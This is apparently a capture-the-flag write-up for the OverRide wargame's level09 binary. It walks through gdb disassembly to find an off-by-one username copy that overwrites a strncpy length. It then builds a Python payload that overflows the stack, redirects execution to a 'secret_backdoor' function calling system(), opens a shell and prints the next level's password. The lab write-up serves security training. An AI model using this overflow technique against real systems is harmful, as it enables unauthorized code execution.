# Level 9

after runing this executable file we found in the begining ask about the username and the message

```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: nourad
>: Welcome, nourad
>: Msg @Unix-Dude
>>: hi alll
>: Msg sent!
level09@OverRide:~$
```

```
Dump of assembler code for function main:
   0x0000000000000aa8 <+0>:     push   rbp
   0x0000000000000aa9 <+1>:     mov    rbp,rsp
   0x0000000000000aac <+4>:     lea    rdi,[rip+0x15d]        # 0xc10
   0x0000000000000ab3 <+11>:    call   0x730 <puts@plt>
   0x0000000000000ab8 <+16>:    call   0x8c0 <handle_msg>
   0x0000000000000abd <+21>:    mov    eax,0x0
   0x0000000000000ac2 <+26>:    pop    rbp
   0x0000000000000ac3 <+27>:    ret
End of assembler dump.
```

after disass the main function we found tre's a function that's call `handle_msg()` in this function we found two function `set_username()` & `set_msg()`

```
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:     push   rbp
   0x00000000000008c1 <+1>:     mov    rbp,rsp
   0x00000000000008c4 <+4>:     sub    rsp,0xc0
   0x00000000000008cb <+11>:    lea    rax,[rbp-0xc0]
   0x00000000000008d2 <+18>:    add    rax,0x8c
   0x00000000000008d8 <+24>:    mov    QWORD PTR [rax],0x0
   0x00000000000008df <+31>:    mov    QWORD PTR [rax+0x8],0x0
   0x00000000000008e7 <+39>:    mov    QWORD PTR [rax+0x10],0x0
   0x00000000000008ef <+47>:    mov    QWORD PTR [rax+0x18],0x0
   0x00000000000008f7 <+55>:    mov    QWORD PTR [rax+0x20],0x0
   0x00000000000008ff <+63>:    mov    DWORD PTR [rbp-0xc],0x8c
   0x0000000000000906 <+70>:    lea    rax,[rbp-0xc0]
   0x000000000000090d <+77>:    mov    rdi,rax
   0x0000000000000910 <+80>:    call   0x9cd <set_username>
   0x0000000000000915 <+85>:    lea    rax,[rbp-0xc0]
   0x000000000000091c <+92>:    mov    rdi,rax
   0x000000000000091f <+95>:    call   0x932 <set_msg>
   0x0000000000000924 <+100>:   lea    rdi,[rip+0x295]        # 0xbc0
   0x000000000000092b <+107>:   call   0x730 <puts@plt>
   0x0000000000000930 <+112>:   leave
   0x0000000000000931 <+113>:   ret
End of assembler dump.
```

they start by set a zero in a variable

```c
    0x00005555555549e9 <+28>:	mov    eax,0x0
    0x00005555555549ee <+33>:	mov    edx,0x10
    0x00005555555549f3 <+38>:	mov    rdi,rsi
    0x00005555555549f6 <+41>:	mov    rcx,rdx
    0x00005555555549f9 <+44>:	rep stos QWORD PTR es:[rdi],rax
    0x00005555555549fc <+47>:	lea    rdi,[rip+0x1e1]
```

we notice that they pass the same address to set_username, set_msg

```c
   0x0000000000000906 <+70>:    lea    rax,[rbp-0xc0] <--
   0x000000000000090d <+77>:    mov    rdi,rax
   0x0000000000000910 <+80>:    call   0x9cd <set_username>
   0x0000000000000915 <+85>:    lea    rax,[rbp-0xc0] <---
   0x000000000000091c <+92>:    mov    rdi,rax
   0x000000000000091f <+95>:    call   0x932 <set_msg>
```

then in the set_username function they try to prepare buffer to pass it to fgets()

```c
   0x00000000000009f9 <+44>:    rep stos QWORD PTR es:[rdi],rax // memset(...)
   0x00000000000009fc <+47>:    lea    rdi,[rip+0x1e1]        # 0xbe4
   0x0000000000000a03 <+54>:    call   0x730 <puts@plt>
   0x0000000000000a08 <+59>:    lea    rax,[rip+0x1d0]        # 0xbdf
   0x0000000000000a0f <+66>:    mov    rdi,rax
   0x0000000000000a12 <+69>:    mov    eax,0x0
   0x0000000000000a17 <+74>:    call   0x750 <printf@plt>
   0x0000000000000a1c <+79>:    mov    rax,QWORD PTR [rip+0x201595]        # 0x201fb8
   0x0000000000000a23 <+86>:    mov    rax,QWORD PTR [rax]
   0x0000000000000a26 <+89>:    mov    rdx,rax
   0x0000000000000a29 <+92>:    lea    rax,[rbp-0x90]
   0x0000000000000a30 <+99>:    mov    esi,0x80
   0x0000000000000a35 <+104>:   mov    rdi,rax
   0x0000000000000a38 <+107>:   call   0x770 <fgets@plt>
```

after reading the username we found there's a loop that check the length of the username if is greater than `0x28`

```c
   0x0000000000000a44 <+119>:   jmp    0xa6a <set_username+157>
   0x0000000000000a46 <+121>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a49 <+124>:   cdqe
   0x0000000000000a4b <+126>:   movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
   0x0000000000000a53 <+134>:   mov    rdx,QWORD PTR [rbp-0x98]
   0x0000000000000a5a <+141>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a5d <+144>:   cdqe
   0x0000000000000a5f <+146>:   mov    BYTE PTR [rdx+rax*1+0x8c],cl
   0x0000000000000a66 <+153>:   add    DWORD PTR [rbp-0x4],0x1
   0x0000000000000a6a <+157>:   cmp    DWORD PTR [rbp-0x4],0x28
   0x0000000000000a6e <+161>:   jg     0xa81 <set_username+180>
   0x0000000000000a70 <+163>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000000a73 <+166>:   cdqe
   0x0000000000000a75 <+168>:   movzx  eax,BYTE PTR [rbp+rax*1-0x90]
   0x0000000000000a7d <+176>:   test   al,al
   0x0000000000000a7f <+178>:   jne    0xa46 <set_username+121>
```

and then print `>: Welcome, abas` and return;

the second function set_msg() they clean the buffer we have and print `>: Msg @Unix-Dude`

```c
   0x000000000000093d <+11>:    mov    QWORD PTR [rbp-0x408],rdi
   0x0000000000000944 <+18>:    lea    rax,[rbp-0x400]
   0x000000000000094b <+25>:    mov    rsi,rax
   0x000000000000094e <+28>:    mov    eax,0x0
   0x0000000000000953 <+33>:    mov    edx,0x80 // 128
   0x0000000000000958 <+38>:    mov    rdi,rsi
   0x000000000000095b <+41>:    mov    rcx,rdx
   0x000000000000095e <+44>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000000961 <+47>:    lea    rdi,[rip+0x265]        # 0xbcd
   0x0000000000000968 <+54>:    call   0x730 <puts@plt>
   0x000000000000096d <+59>:    lea    rax,[rip+0x26b]        # 0xbdf
   0x0000000000000974 <+66>:    mov    rdi,rax
   0x0000000000000977 <+69>:    mov    eax,0x0
   0x000000000000097c <+74>:    call   0x750 <printf@plt>
```

and then read the msg by fgets and try to copy the msg into `rbp-0x408`

```c
  0x000000000000099d <+107>:   call   0x770 <fgets@plt>
   0x00000000000009a2 <+112>:   mov    rax,QWORD PTR [rbp-0x408]
   0x00000000000009a9 <+119>:   mov    eax,DWORD PTR [rax+0xb4]
   0x00000000000009af <+125>:   movsxd rdx,eax
   0x00000000000009b2 <+128>:   lea    rcx,[rbp-0x400] // size used in strncpy
   0x00000000000009b9 <+135>:   mov    rax,QWORD PTR [rbp-0x408]
   0x00000000000009c0 <+142>:   mov    rsi,rcx
   0x00000000000009c3 <+145>:   mov    rdi,rax
   0x00000000000009c6 <+148>:   call   0x720 <strncpy@plt>
```

> lets try to check our stack we use `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` as username we got :

```c
0x7fffffffe570: 0xffffe6b0      0x00007fff      0xf7a95d45      0x00007fff
0x7fffffffe580: 0xf7dd4260      0x00007fff      0xf7a9608f      0x41414141
0x7fffffffe590: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5a0: 0x41414141      0x41414141      0x000a4141      0x00000000
0x7fffffffe5b0: 0x00000000      0x0000008c      0xffffe5d0      0x00007fff
```

then try to clear buffer

```c
(gdb) x/300wx $rbp-0x408
0x7fffffffe0e8: 0xffffe500      0x00007fff      0x00000000      0x00000000
0x7fffffffe0f8: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe108: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe118: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe128: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe138: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe148: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe158: 0x00000000      0x00000000      0x00000000      0x00000000
.
.
.
0x7fffffffe4e8: 0x00000000      0x00000000      0xffffe5c0      0x00007fff
0x7fffffffe4f8: 0x55554924      0x00005555      0x0000000a      0x00000000
0x7fffffffe508: 0x55554c69      0x00005555      0xf7ff7000      0x00007fff
0x7fffffffe518: 0xf7a94713      0x00007fff      0xf7dd4260      0x00007fff
0x7fffffffe528: 0xf7dd4260      0x00007fff      0x0000000a      0x00000000
0x7fffffffe538: 0xf7ff7000      0x00007fff      0x0000002d      0x00000000
0x7fffffffe548: 0xf7a945da      0x00007fff      0x00000086      0x00000000
0x7fffffffe558: 0x0000002d      0x00000000      0x0000000a      0x00000000
0x7fffffffe568: 0x55554c10      0x00005555      0xffffe6b0      0x00007fff
0x7fffffffe578: 0xf7a95d45      0x00007fff      0xf7dd4260      0x00007fff
0x7fffffffe588: 0xf7a9608f      0x41414141      0x41414141      0x41414141
```

> no we set msg as `BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB`

we check the size used in strncpy and we found

```c
(gdb) x/10wx $rax+0xb4
0x7fffffffe5b4: 0x0000008c      0xffffe5d0      0x00007fff      0xffffe5d0
                    ^
                    |
                strncpy length
```

as u see this address we found it after the username in the last example so we can overwrite it by the username

```c
0x7fffffffe580: 0xf7dd4260      0x00007fff      0xf7a9608f      0x41414141
0x7fffffffe590: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5a0: 0x41414141      0x41414141      0x000a4141      0x00000000
0x7fffffffe5b0: 0x00000000      0x0000008c      0xffffe5d0      0x00007fff
                                    ^
                                    |
                                strncpy length
```

after 40 A we can write the length we want in this address, in this case we have NX, PIE so wa cant use `SHELLCODE` lets try `Return-to-libc`, after calcul the ofsset we found it : 200, + 8 the new address we must set 208 = 0xD0 insted of 0x8c

```c
(gdb) p $rbp-0xc0
$1 = (void *) 0x7fffffffe4c0
(gdb) p $rbp+0x8
$2 = (void *) 0x7fffffffe588
```

when we check info func we found a function call `secret_backdoor` we must set this func in return address

```c
All defined functions:

Non-debugging symbols:
0x00000000000006f0  _init
0x0000000000000720  strncpy
0x0000000000000720  strncpy@plt
0x0000000000000730  puts
0x0000000000000730  puts@plt
0x0000000000000740  system
0x0000000000000740  system@plt
0x0000000000000750  printf
0x0000000000000750  printf@plt
0x0000000000000760  __libc_start_main
0x0000000000000760  __libc_start_main@plt
0x0000000000000770  fgets
0x0000000000000770  fgets@plt
0x0000000000000780  __cxa_finalize
0x0000000000000780  __cxa_finalize@plt
0x0000000000000790  _start
0x00000000000007bc  call_gmon_start
0x00000000000007e0  __do_global_dtors_aux
0x0000000000000860  frame_dummy
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
0x0000000000000ad0  __libc_csu_init
0x0000000000000b60  __libc_csu_fini
0x0000000000000b70  __do_global_ctors_aux
0x0000000000000ba8  _fini
(gdb) p &secret_backdoor
$1 = (<text variable, no debug info> *) 0x55555555488c <secret_backdoor>
```

in this function there fgets read a value and pass it to system()

```
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:     push   rbp
   0x000055555555488d <+1>:     mov    rbp,rsp
   0x0000555555554890 <+4>:     add    rsp,0xffffffffffffff80
   0x0000555555554894 <+8>:     mov    rax,QWORD PTR [rip+0x20171d]        # 0x555555755fb8
   0x000055555555489b <+15>:    mov    rax,QWORD PTR [rax]
   0x000055555555489e <+18>:    mov    rdx,rax
   0x00005555555548a1 <+21>:    lea    rax,[rbp-0x80]
   0x00005555555548a5 <+25>:    mov    esi,0x80
   0x00005555555548aa <+30>:    mov    rdi,rax
   0x00005555555548ad <+33>:    call   0x555555554770 <fgets@plt>
   0x00005555555548b2 <+38>:    lea    rax,[rbp-0x80]
   0x00005555555548b6 <+42>:    mov    rdi,rax
   0x00005555555548b9 <+45>:    call   0x555555554740 <system@plt>
   0x00005555555548be <+50>:    leave
   0x00005555555548bf <+51>:    ret
End of assembler dump.
```

lets get the flag

```c
python -c "print 'A' * 40 + '\xD0'" > tmp // we fill by D0 208
python -c "print 'B' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1]" >> tmp
```

```
level09@OverRide:~$ (cat tmp; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
